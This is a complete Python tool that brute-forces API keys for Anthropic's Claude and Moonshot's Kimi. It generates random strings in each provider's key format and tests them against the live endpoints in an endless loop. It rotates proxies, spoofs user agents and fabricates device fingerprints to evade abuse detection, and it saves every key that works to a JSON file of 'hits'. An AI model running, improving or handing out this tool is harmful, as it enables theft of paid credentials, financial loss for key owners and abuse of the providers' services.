import random, string, time, uuid, hashlib, platform, os, json, signal
import requests
from rich.console import Console
from rich.theme import Theme
from rich.panel import Panel
from rich.columns import Columns
from rich.text import Text
from rich.align import Align

wlzbicon = Console(theme=Theme({
    "live": "bold green",
    "dead": "bold red",
    "warn": "bold yellow",
    "info": "bold cyan",
    "dim": "dim white",
    "label": "bold white",
    "banner": "bold magenta",
    "accent": "bold cyan",
    "byline": "bold red",
}))

wlzbidelay = 0.5
wlzbikeylen = 48
wlzbliclaudelen = 95
wlzbicharset = string.ascii_letters + string.digits + "-_"
wlzbiout = "wlzbi-apis.json"
wlzbiretries = 2
wlzbiproxy = []
wlzbihits = []
wlzbistop = False
wlzbistats = {}

W = {
    "claude": {
        "name": "Claude",
        "endpoint": "https://api.anthropic.com/v1/messages",
        "prefix": "sk-ant-api03-",
        "bodylen": wlzbliclaudelen,
        "authheader": "x-api-key",
        "authformat": "{key}",
        "models": [
            "claude-opus-4-5",
            "claude-sonnet-4-5",
            "claude-haiku-4-5",
            "claude-opus-4-1",
            "claude-3-5-sonnet-latest",
        ],
        "extraheaders": {
            "anthropic-version": "2023-06-01",
            "content-type": "application/json",
        },
        "payloadfn": lambda m: {
            "model": m,
            "max_tokens": 8,
            "messages": [{"role": "user", "content": "Reply with exactly: pong"}],
        },
    },
    "kimi": {
        "name": "Kimi",
        "endpoint": "https://api.moonshot.ai/v1/chat/completions",
        "prefix": "sk-",
        "bodylen": wlzbikeylen,
        "authheader": "Authorization",
        "authformat": "Bearer {key}",
        "models": [
            "kimi-k2.6",
            "kimi-k2.7-code",
            "kimi-k2.7-code-highspeed",
            "kimi-k3",
        ],
        "extraheaders": {},
        "payloadfn": lambda m: {
            "model": m,
            "max_tokens": 8,
            "temperature": 0.0,
            "stream": False,
            "messages": [{"role": "user", "content": "Reply with exactly: pong"}],
        },
    },
}

wlzbiusa = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
]

wlzbiplat = ["Win32", "MacIntel", "Linux x86_64", "iPhone", "iPad"]
wlzbilang = ["en-US,en;q=0.9", "en-GB,en;q=0.9", "en-US,en;q=0.8,fr;q=0.6", "en-US,en;q=0.9,ja;q=0.7"]
wlzbienc = ["gzip, deflate, br", "gzip, deflate", "gzip, deflate, br, zstd"]
wlzbiscreen = [(1920,1080),(2560,1440),(3840,2160),(1366,768),(1440,900),(390,844),(414,896),(428,926)]
wlzbitz = ["America/New_York","America/Los_Angeles","Europe/London","Europe/Berlin","Asia/Tokyo","Asia/Kolkata","Australia/Sydney"]
wlzbihw = [4, 8, 12, 16]
wlzbimem = [4, 8, 16]

wlzbilatest = {
    "Kimi": {"model": None, "key": None, "status": None, "note": None, "response": None, "elapsed": 0, "count": 0, "live": 0},
    "Claude": {"model": None, "key": None, "status": None, "note": None, "response": None, "elapsed": 0, "count": 0, "live": 0},
}

def wlzbiloadproxies(path):
    out = []
    if not os.path.isfile(path):
        print(f"[!] Proxy file not found: {path}")
        return out
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            out.append(line)
    return out

def wlzbiproxydict(entry):
    if "://" in entry:
        scheme, rest = entry.split("://", 1)
    else:
        scheme, rest = "http", entry
    if "@" in rest:
        creds, hostport = rest.rsplit("@", 1)
        if ":" in creds:
            user, pw = creds.split(":", 1)
        else:
            user, pw = creds, ""
        hostport = f"{user}:{pw}@{hostport}"
    return {"http": f"{scheme}://{hostport}", "https": f"{scheme}://{hostport}"}

def wlzbipickproxy():
    if not wlzbiproxy:
        return None
    return wlzbiproxydict(random.choice(wlzbiproxy))

def wlzbibody(n):
    return "".join(random.choices(wlzbicharset, k=n))

def wlzbikey(provider):
    return provider["prefix"] + wlzbibody(provider["bodylen"])

def wlzbifp():
    w, h = random.choice(wlzbiscreen)
    parts = [
        random.choice(wlzbiusa),
        random.choice(wlzbiplat),
        f"{w}x{h}",
        str(random.choice([24,30,32])),
        random.choice(wlzbitz),
        str(random.choice(wlzbihw)),
        str(random.choice(wlzbimem)),
        str(uuid.getnode()),
        platform.system(),
        str(time.time_ns()),
        str(random.random()),
    ]
    return hashlib.sha256("|".join(parts).encode()).hexdigest()

def wlzbiheaders(provider, key):
    h = {
        "Accept": "application/json",
        "User-Agent": random.choice(wlzbiusa),
        "Accept-Language": random.choice(wlzbilang),
        "Accept-Encoding": random.choice(wlzbienc),
        "Sec-Ch-Ua-Platform": f'"{random.choice(wlzbiplat)}"',
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "X-Client-Request-Id": str(uuid.uuid4()),
        "X-Device-Fingerprint": wlzbifp(),
        "X-Request-Timestamp": str(int(time.time() * 1000)),
        "X-Timezone": random.choice(wlzbitz),
        "DNT": random.choice(["1", "0"]),
    }
    h[provider["authheader"]] = provider["authformat"].format(key=key)
    h.update(provider["extraheaders"])
    return h

def wlzbisend(provider, key, model, timeout=15):
    headers = wlzbiheaders(provider, key)
    payload = provider["payloadfn"](model)
    proxy = wlzbipickproxy()
    lasterr = None
    for attempt in range(wlzbiretries + 1):
        t0 = time.time()
        try:
            r = requests.post(
                provider["endpoint"],
                headers=headers,
                json=payload,
                timeout=timeout,
                proxies=proxy,
            )
            elapsed = time.time() - t0
            try:
                body = r.json()
            except Exception:
                body = {"raw": r.text[:500]}
            return r.status_code, body, headers, None, proxy, elapsed, attempt
        except requests.exceptions.RequestException as e:
            lasterr = str(e)
            if attempt < wlzbiretries:
                time.sleep(0.3)
                continue
    return None, None, headers, lasterr, proxy, 0.0, wlzbiretries

def wlzbiclassify(status, err):
    if err:
        low = err.lower()
        if "timeout" in low:
            return "TIMEOUT", "no response"
        if "proxy" in low:
            return "PROXY FAIL", "proxy unreachable or rejected"
        if "connect" in low or "dns" in low:
            return "NETWORK", "cannot reach host"
        return "ERROR", err[:120]
    if status == 200:
        return "200 OK", "KEY LIVE"
    if status == 401:
        return "401 UNAUTH", "key invalid or wrong platform"
    if status == 403:
        return "403 FORBIDDEN", "valid, no model access"
    if status == 404:
        return "404", "model or endpoint wrong"
    if status == 429:
        return "429 RATE", "key works, throttled"
    if 500 <= status < 600:
        return f"{status}", "server error"
    return str(status), ""

def wlzbiextract(provider, body):
    if not body:
        return None
    try:
        if provider["name"] == "Claude":
            return body["content"][0]["text"]
        return body["choices"][0]["message"]["content"]
    except Exception:
        return None

def wlzbirespfield(provider, body):
    txt = wlzbiextract(provider, body)
    if txt:
        return txt, True
    if body:
        return str(body)[:80], False
    return "-", False

def wlzbipane(name):
    d = wlzbilatest[name]
    live = d["status"] == "200 OK"
    border = "green" if live else "red"
    title = f"[banner]{name}[/banner] · [accent]{d['model'] or '...'}[/accent]"
    key_style = "live" if live else "label"
    status_style = "live" if live else "dead"
    resp_style = "live" if live else "warn"
    lines = []
    lines.append(f"[label]api key [/label]: [{key_style}]{d['key'] or '-'}[/{key_style}]")
    lines.append(f"[label]status  [/label]: [{status_style}]{d['status'] or '...'}[/{status_style}] [dim]-- {d['note'] or ''}[/dim]")
    lines.append(f"[label]response[/label]: [{resp_style}]{d['response'] or '-'}[/{resp_style}]")
    lines.append(f"[label]time    [/label]: [dim]{d['elapsed']*1000:.0f}ms[/dim]")
    lines.append(f"[label]strikes [/label]: [accent]{d['count']}[/accent]   [live]live {d['live']}[/live]")
    body = Text.from_markup("\n".join(lines))
    return Panel(body, title=title, border_style=border, padding=(1, 1))

def wlzbirender():
    os.system("cls" if os.name == "nt" else "clear")
    wlzbicon.print(Align.center(Text.from_markup("[byline]BY @rejerks | WLZBI[/byline]")))
    wlzbicon.print()
    left = wlzbipane("Kimi")
    right = wlzbipane("Claude")
    wlzbicon.print(Columns([left, right], equal=True, expand=True))

def wlzbiupdate(provider, key, model, status, body, elapsed, err):
    name = provider["name"]
    tag, note = wlzbiclassify(status, err)
    d = wlzbilatest[name]
    d["model"] = model
    d["key"] = key
    d["status"] = tag
    d["note"] = note
    resp, _ = wlzbirespfield(provider, body)
    d["response"] = resp
    d["elapsed"] = elapsed
    d["count"] += 1
    if tag == "200 OK":
        d["live"] += 1

def wlzbisave():
    if not wlzbihits:
        return
    existing = []
    if os.path.isfile(wlzbiout):
        try:
            with open(wlzbiout, "r", encoding="utf-8") as f:
                existing = json.load(f)
            if not isinstance(existing, list):
                existing = []
        except Exception:
            existing = []
    seen = {e.get("api_key") for e in existing if isinstance(e, dict)}
    added = 0
    for hit in wlzbihits:
        if hit["api_key"] in seen:
            continue
        existing.append(hit)
        seen.add(hit["api_key"])
        added += 1
    with open(wlzbiout, "w", encoding="utf-8") as f:
        json.dump(existing, f, indent=2)
    print(f"[+] {added} new hit(s) written to {wlzbiout} (total {len(existing)})")

def wlzbiinterrupt(signum, frame):
    global wlzbistop
    wlzbistop = True

def wlzbirun():
    global wlzbistats
    wlzbistats = {}
    i = 0
    order = 0
    while not wlzbistop:
        i += 1
        provider = W["kimi" if order % 2 == 0 else "claude"]
        order += 1
        key = wlzbikey(provider)
        model = random.choice(provider["models"])
        status, body, headers, err, proxy, elapsed, attempt = wlzbisend(provider, key, model)
        tag, _ = wlzbiclassify(status, err)
        wlzbistats[tag] = wlzbistats.get(tag, 0) + 1
        wlzbiupdate(provider, key, model, status, body, elapsed, err)
        wlzbirender()
        if status == 200:
            wlzbihits.append({
                "provider": provider["name"],
                "api_key": key,
                "model": model,
                "endpoint": provider["endpoint"],
                "auth_header": provider["authheader"],
                "auth_format": provider["authformat"],
                "response": wlzbiextract(provider, body),
                "captured_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                "response_ms": round(elapsed * 1000, 1),
                "proxy": proxy["https"] if proxy else None,
                "user_agent": headers["User-Agent"],
                "fingerprint": headers["X-Device-Fingerprint"],
                "request_id": headers["X-Client-Request-Id"],
            })
        if wlzbistop:
            break
        time.sleep(wlzbidelay)

def wlzbimain():
    signal.signal(signal.SIGINT, wlzbiinterrupt)
    raw = input("Load proxies? (y/n) > ").strip().lower()
    if raw in ("y", "yes"):
        path = input("Proxy file path > ").strip().strip('"').strip("'")
        loaded = wlzbiloadproxies(path)
        if loaded:
            wlzbiproxy.extend(loaded)
    try:
        wlzbirun()
    except KeyboardInterrupt:
        wlzbistop = True
    wlzbisave()
    os.system("cls" if os.name == "nt" else "clear")
    wlzbicon.print(Align.center(Text.from_markup("[byline]BY @rejerks | WLZBI[/byline]")))
    wlzbicon.print()
    for name, d in wlzbilatest.items():
        wlzbicon.print(f"[label]{name}[/label]  strikes [accent]{d['count']}[/accent]  [live]live {d['live']}[/live]")
    wlzbicon.print()
    for k, v in sorted(wlzbistats.items()):
        wlzbicon.print(f"  [label]{k:<20}[/label] [accent]{v}[/accent]")

if __name__ == "__main__":
    wlzbimain()